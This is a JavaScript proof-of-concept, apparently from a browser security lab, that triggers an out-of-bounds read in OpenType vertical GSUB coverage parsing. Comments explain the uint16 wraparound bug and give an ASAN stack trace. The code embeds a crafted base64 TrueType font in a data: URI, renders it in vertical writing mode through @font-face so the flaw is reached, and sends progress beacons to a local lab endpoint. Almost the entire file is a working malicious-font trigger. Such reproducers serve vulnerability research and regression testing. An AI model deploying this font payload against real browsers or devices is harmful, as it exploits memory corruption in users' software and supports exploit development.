// Upstream fix 2196077a54: out-of-bounds read in OpenType vertical GSUB coverage range fill.
//
// CONFIRMED in the ASAN build of Sony's own tree, with the full stack:
//   READ of size 2
//   #0 OpenType::BigEndianUShort::operator unsigned short()   OpenTypeTypes.h:44
//   #7 OpenType::LookupTable::getSubstitutions()              OpenTypeVerticalData.cpp:182
//   #9 GSUBTable::getVerticalGlyphSubstitutions()
//   #10 OpenTypeVerticalData::loadVerticalGlyphSubstitutions() :493
//   #21 CachedFont::createFont <- @font-face
//
// fromEnd = end + 1 as uint16_t wraps to 0 when end == 0xFFFF, so the guard indexTo + (fromEnd - from)
// underflows to -1 and passes; the loop then walks `from` from start to 0xFFFF reading
// substitute[indexTo] with no bound. The font below carries exactly that: a Coverage Format 2 range
// start=1, end=0xFFFF, one declared substitute, and vhea/vmtx so the vertical path is reached at all.
//
// Inlined as a data: URI so the case needs nothing from the lab server: an @font-face is enough, the
// text does not even have to be looked at for long.
(function () {
  function send(t) { try { navigator.sendBeacon('/beacon', t); } catch (e) {}
                     try { var i = new Image(); i.src = '/beacon-c013-' + encodeURIComponent(t); } catch (e) {} }
  try {
    var src = "data:font/ttf;base64,AAEAAAANAIAAAwBQR1NVQrr8vwIAAAN4AAAASk9TLzJFIUQ2AAABWAAAAGBjbWFwAAwAlQAAAcAAAAA0Z2x5Zg5yCWwAAAH8AAAATmhlYWQv3LecAAAA3AAAADZoaGVhBd4BkgAAARQAAAAkaG10eAK8AMgAAAG4AAAACGxvY2EAGgA0AAAB9AAAAAhtYXhwAAUABgAAATgAAAAgbmFtZVc5MVoAAAJMAAABAnBvc3QAKQAlAAADUAAAACh2aGVhCJsBLQAAA8QAAAAkdm10eAXcA+gAAAPoAAAACAABAAAAAQAAF1ZiMl8PPPUAAwPoAAAAAOcFOgAAAAAA5wU6AABkAAACWAK8AAAAAwACAAAAAAAAAAEAAAMg/zgAAAJYAGQAAAJYAAEAAAAAAAAAAAAAAAAAAAABAAEAAAADAAQAAQAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAwJYAZAABQAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAPz8/PwAAAEEAQgMg/zgAAAMgAMgAAAAAAAAAAAAAAAAAAAAgAAACWABkAGQAZAAAAAIAAAADAAAAFAADAAEAAAAUAAQAIAAAAAQABAABAAAAQv//AAAAQf///8AAAQAAAAAAAAANABoAJwABAGQAAAJYArwAAwAAMxEhEWQB9AK8/UQAAAEAZAAAAlgCvAADAAAzESERZAH0Arz9RAAAAQBkAAACWAK8AAMAADMRIRFkAfQCvP1EAAAAAAAACgB+AAEAAAAAAAEABwAAAAEAAAAAAAIABwAHAAEAAAAAAAMADwAOAAEAAAAAAAQADwAOAAEAAAAAAAYADwAdAAMAAQQJAAEADgAsAAMAAQQJAAIADgA6AAMAAQQJAAMAHgBIAAMAAQQJAAQAHgBIAAMAAQQJAAYAHgBmR3N1Yk9vYlJlZ3VsYXJHc3ViT29iIFJlZ3VsYXJHc3ViT29iLVJlZ3VsYXIARwBzAHUAYgBPAG8AYgBSAGUAZwB1AGwAYQByAEcAcwB1AGIATwBvAGIAIABSAGUAZwB1AGwAYQByAEcAcwB1AGIATwBvAGIALQBSAGUAZwB1AGwAYQByAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAJAAlAAEAAAAKAB4ALAABREZMVAAIAAQAAAAA//8AAQAAAAF2ZXJ0AAgAAAABAAAAAQAEAAEAAAABAAgAAgAIAAEAAQACAAEAAf//AAAAAAABAAAB9P4MAAAD6AH0/zgEsAAAAAAAAAAAAAAAAAAAAAAAAQPoAfQB9AH0";
    var st = document.createElement('style');
    st.textContent = "@font-face{font-family:GsubOob;src:url('" + src + "') format('truetype')}"
                   + "#gsuboob{writing-mode:vertical-rl;font-family:GsubOob,monospace;font-size:96px}";
    document.head.appendChild(st);
    var d = document.createElement('div');
    d.id = 'gsuboob';
    d.textContent = 'ABABAB';
    document.body.appendChild(d);
    document.fonts.load('96px GsubOob').then(function (f) {
      send('c013-font-loaded:' + f.length);
      d.textContent = 'ABABABABAB';
      d.getBoundingClientRect();
      send('c013-rendered');
    }, function (e) { send('c013-font-error:' + (e && e.name)); });
  } catch (e) { send('c013-threw:' + (e && e.name)); }
})();
